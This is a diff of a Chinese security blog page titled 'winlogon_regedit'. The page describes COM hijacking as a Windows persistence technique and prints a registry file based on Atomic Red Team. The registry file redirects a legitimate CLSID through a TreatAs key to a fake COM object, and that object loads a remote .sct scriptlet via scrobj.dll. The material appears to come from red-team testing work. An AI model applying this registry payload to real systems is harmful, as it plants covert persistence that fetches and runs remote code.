@@ -48,7 +48,7 @@
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="http://oc78wb8cz.bkt.clouddn.com/IMG_20180212_201037.jpg">
 <meta property="og:image" content="http://oc78wb8cz.bkt.clouddn.com/1518437671161.jpg">
-<meta property="og:updated_time" content="2018-07-01T06:43:30.000Z">
+<meta property="og:updated_time" content="2018-10-04T01:50:33.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="winlogon_regedit">
 <meta name="twitter:image" content="http://oc78wb8cz.bkt.clouddn.com/IMG_20180212_201037.jpg">
@@ -440,7 +440,7 @@
       
         <span itemprop="articleBody"><p><img src="http://oc78wb8cz.bkt.clouddn.com/IMG_20180212_201037.jpg" alt="enter description here"><br><a id="more"></a></p>
 <h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><p><div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div></p>
-<script type="text/javascript" src="http://7xjfim.com2.z0.glb.qiniucdn.com/Iva.js"></script>
+<script type="text/javascript" src="http://oc78wb8cz.bkt.clouddn.com/cytron.core.js"></script>
 <script>
     var ivaInstance = new Iva('ivaLive', {
         appkey: 'By9WGzBIx', //应用标示
@@ -449,7 +449,7 @@
         cover: '' //视频封面，只有在autoplay:false才可生效
     });
 </script>
-<script src="//cytroncdn.videojj.com/latest/Iva.js"></script>
+<script src="http://oc78wb8cz.bkt.clouddn.com/lva.js"></script>
 
 <figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Microsoft组件对象模型（COM）是Windows内的一个系统，用于通过操作系统实现软件组件之间的交互。</span><br><span class="line"><span class="number">1</span>攻击者可以使用这个系统插入恶意代码，通过劫持COM引用和关系来代替合法的软件来执行持久化。</span><br><span class="line">劫持COM对象需要在Windows注册表中进行更改，以将引用替换为可能导致该组件在执行时无法工作</span><br><span class="line">的合法系统组件。当系统组件通过正常的系统操作执行时，攻击者的代码将被执行。<span class="number">2</span> 攻击者很可能劫</span><br><span class="line">持足够频繁使用的对象来保持一致的持久性水平，但不可能在系统内破坏明显的功能，以避免可能导致</span><br><span class="line">检测的系统不稳定。</span><br></pre></td></tr></table></figure>
 <h2 id="winlogon-reg"><a href="#winlogon-reg" class="headerlink" title="winlogon.reg"></a>winlogon.reg</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Windows Registry Editor Version <span class="number">5.00</span></span><br><span class="line">[HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicRedTeam.<span class="number">1.00</span>]</span><br><span class="line">@=<span class="string">"AtomicRedTeam"</span></span><br><span class="line">[HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicRedTeam.<span class="number">1.00</span>\CLSID]</span><br><span class="line">@=<span class="string">"&#123;00000001-0000-0000-0000-0000FEEDACDC&#125;"</span></span><br><span class="line">[HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicRedTeam]</span><br><span class="line">@=<span class="string">"AtomicRedTeam"</span></span><br><span class="line">[HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicRedTeam\CLSID]</span><br><span class="line">@=<span class="string">"&#123;00000001-0000-0000-0000-0000FEEDACDC&#125;"</span></span><br><span class="line">[HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\&#123;<span class="number">00000001</span>-<span class="number">0000</span>-<span class="number">0000</span>-<span class="number">0000</span>-<span class="number">0000</span>FEEDACDC&#125;]</span><br><span class="line">@=<span class="string">"AtomicRedTeam"</span></span><br><span class="line">[HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\&#123;<span class="number">00000001</span>-<span class="number">0000</span>-<span class="number">0000</span>-<span class="number">0000</span>-<span class="number">0000</span>FEEDACDC&#125;\InprocServer32]</span><br><span class="line">@=<span class="string">"C:\\WINDOWS\\system32\\scrobj.dll"</span></span><br><span class="line"><span class="string">"ThreadingModel"</span>=<span class="string">"Apartment"</span></span><br><span class="line">[HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\&#123;<span class="number">00000001</span>-<span class="number">0000</span>-<span class="number">0000</span>-<span class="number">0000</span>-<span class="number">0000</span>FEEDACDC&#125;\ProgID]</span><br><span class="line">@=<span class="string">"AtomicRedTeam.1.00"</span></span><br><span class="line">[HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\&#123;<span class="number">00000001</span>-<span class="number">0000</span>-<span class="number">0000</span>-<span class="number">0000</span>-<span class="number">0000</span>FEEDACDC&#125;\ScriptletURL]</span><br><span class="line">@=<span class="string">"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Windows/Payloads/COMHijackScripts/AtomicRedTeam.sct"</span></span><br><span class="line">[HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\&#123;<span class="number">00000001</span>-<span class="number">0000</span>-<span class="number">0000</span>-<span class="number">0000</span>-<span class="number">0000</span>FEEDACDC&#125;\VersionIndependentProgID]</span><br><span class="line">@=<span class="string">"AtomicRedTeam"</span></span><br><span class="line">[HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\&#123;<span class="number">06</span>DA0625-<span class="number">9701</span>-<span class="number">43</span>DA-BFD7-FBEEA2180A1E&#125;]</span><br><span class="line">[HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\&#123;<span class="number">06</span>DA0625-<span class="number">9701</span>-<span class="number">43</span>DA-BFD7-FBEEA2180A1E&#125;\TreatAs]</span><br><span class="line">@=<span class="string">"&#123;00000001-0000-0000-0000-0000FEEDACDC&#125;"</span></span><br></pre></td></tr></table></figure>
@@ -689,21 +689,21 @@
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">130</span>
+              <span class="site-state-item-count">120</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
 
           <div class="site-state-item site-state-categories">
             
-              <span class="site-state-item-count">12</span>
+              <span class="site-state-item-count">9</span>
               <span class="site-state-item-name">分类</span>
               
           </div>
 
           <div class="site-state-item site-state-tags">
             <a href="/tags">
-              <span class="site-state-item-count">18</span>
+              <span class="site-state-item-count">14</span>
               <span class="site-state-item-name">标签</span>
               </a>
           </div>
